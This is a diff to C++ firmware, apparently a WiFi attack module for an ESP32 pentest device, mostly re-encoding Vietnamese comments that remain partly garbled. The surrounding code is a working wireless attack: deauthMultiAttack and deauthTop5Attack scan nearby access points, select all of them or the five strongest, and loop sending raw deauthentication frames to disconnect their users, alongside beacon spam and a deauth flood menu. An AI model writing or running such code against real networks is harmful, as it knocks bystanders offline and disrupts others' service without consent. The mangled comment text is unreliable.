@@ -20,7 +20,7 @@
 #include <Arduino.h>
 #include <globals.h>
 #include <nvs_flash.h>
-#include <algorithm> // Th�m d�ng n�y d? d�ng std::sort
+#include <algorithm> // Thêm dòng này d? dùng std::sort
 
 #define WIFI_ATK_NAME "BruceAttack"
 extern bool showHiddenNetworks;
@@ -289,7 +289,7 @@ void wifi_atk_menu() {
         {"Beacon SPAM",  [=]() { beaconAttack(); }     },
         {"Deauth Flood", [=]() { deauthFloodAttack(); }},
         
-        // --- TH�M 2 D�NG N�Y V�O ---
+        // --- THÊM 2 DÒNG NÀY VÀO ---
         {"Deauth Multi", [=]() { deauthMultiAttack(); }},
         {"Deauth Top 5", [=]() { deauthTop5Attack(); }},
     };
@@ -844,7 +844,7 @@ void deauthMultiAttack() {
         memset(&r, 0, sizeof(r));
         memcpy(r.bssid, WiFi.BSSID(i), 6);
         r.primary = static_cast<uint8_t>(WiFi.channel(i));
-        // B?n c� th? l?y th�m SSID n?u sau n�y mu?n hi?n th? t�n AP dang b? deauth
+        // B?n có th? l?y thêm SSID n?u sau này mu?n hi?n th? tên AP dang b? deauth
         if (strlen(WiFi.SSID(i).c_str()) > 0) {
             strncpy((char *)r.ssid, WiFi.SSID(i).c_str(), sizeof(r.ssid) - 1);
             r.ssid[sizeof(r.ssid) - 1] = '\0';
@@ -854,7 +854,7 @@ void deauthMultiAttack() {
         all_targets.push_back(r);
     }
     
-    // �?y to�n b? danh s�ch qu�t du?c v�o Engine Bruce
+    // Ð?y toàn b? danh sách quét du?c vào Engine Bruce
     execute_multi_bruce_style(all_targets); 
 }
 char randomName[32];
@@ -897,8 +897,8 @@ const char Beacons[] PROGMEM = {"Mom Use This One\n"
                                 "Darude LANstorm\n"
                                 "Never Gonna Give You Up\n"
                                 "Hide Yo Kids, Hide Yo Wi-Fi\n"
-                                "Loading�\n"
-                                "Searching�\n"
+                                "Loading…\n"
+                                "Searching…\n"
                                 "VIRUS.EXE\n"
                                 "Virus-Infected Wi-Fi\n"
                                 "Starbucks Wi-Fi\n"
@@ -967,12 +967,12 @@ void beaconSpamList(const char list[]) {
         if (EscPress) break;
     }
 }
-// --- H�M MULTI-DEAUTH (S? D?NG ENGINE G?C C?A BRUCE) ---
+// --- HÀM MULTI-DEAUTH (S? D?NG ENGINE G?C C?A BRUCE) ---
 void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
     if (targets.empty()) return;
     resetGlobalState();
     
-    // T?t WebUI d? tr�nh xung d?t t�i nguy�n m?ng
+    // T?t WebUI d? tránh xung d?t tài nguyên m?ng
     cleanlyStopWebUiForWiFiFeature(); 
     if (!wifi_atk_setWifi()) return;
 
@@ -985,22 +985,22 @@ void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
 
     while (true) {
         for (const auto &target : targets) {
-            // 1. G?i h�m chu?n b? d?n & nh?y k�nh c?a Bruce g?c
+            // 1. G?i hàm chu?n b? d?n & nh?y kênh c?a Bruce g?c
             wsl_bypasser_send_raw_frame(&target, target.primary, _default_target);
 
-            // 2. G?i h�m b?n c?a Bruce g?c (B?n 10 v�ng, m?i v�ng 3 g�i = 30 g�i / AP)
+            // 2. G?i hàm b?n c?a Bruce g?c (B?n 10 vòng, m?i vòng 3 gói = 30 gói / AP)
             for (int i = 0; i < 10; i++) {
                 send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                 if (check(EscPress)) break;
             }
 
-            // 3. �I?M S?NG C�N CHO C5: Ngh? 10ms gi?a m?i AP d? kh�ng b? treo
+            // 3. ÐI?M S?NG CÒN CHO C5: Ngh? 10ms gi?a m?i AP d? không b? treo
             vTaskDelay(pdMS_TO_TICKS(10));
             if (check(EscPress)) break;
         }
         
         if (check(EscPress)) break;
-        // Ngh? 50ms sau khi qu�t xong 1 v�ng t?t c? m?c ti�u
+        // Ngh? 50ms sau khi quét xong 1 vòng t?t c? m?c tiêu
         vTaskDelay(pdMS_TO_TICKS(50)); 
     }
 
@@ -1008,7 +1008,7 @@ void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
     returnToMenu = true;
 }
 
-// --- T�NH NANG 1: TOP 5 RSSI ---
+// --- TÍNH NANG 1: TOP 5 RSSI ---
 void deauthTop5Attack() {
     displayTextLine("Scanning..");
     int nets = WiFi.scanNetworks(false, showHiddenNetworks);
@@ -1021,7 +1021,7 @@ void deauthTop5Attack() {
         r.rssi = WiFi.RSSI(i);
         temp_list.push_back(r);
     }
-    // S?p x?p s�ng kh?e d?ng d?u
+    // S?p x?p sóng kh?e d?ng d?u
     std::sort(temp_list.begin(), temp_list.end(), [](const wifi_ap_record_t& a, const wifi_ap_record_t& b) {
         return a.rssi > b.rssi;
     });
@@ -1029,7 +1029,7 @@ void deauthTop5Attack() {
     std::vector<wifi_ap_record_t> top5;
     for (int i = 0; i < std::min((int)temp_list.size(), 5); i++) top5.push_back(temp_list[i]);
     
-    // G?I H�M BRUCE STYLE
+    // G?I HÀM BRUCE STYLE
     execute_multi_bruce_style(top5); 
 }
 
@@ -1169,4 +1169,3 @@ void beaconAttack() {
     }
     wifi_atk_unsetWifi();
 }
-
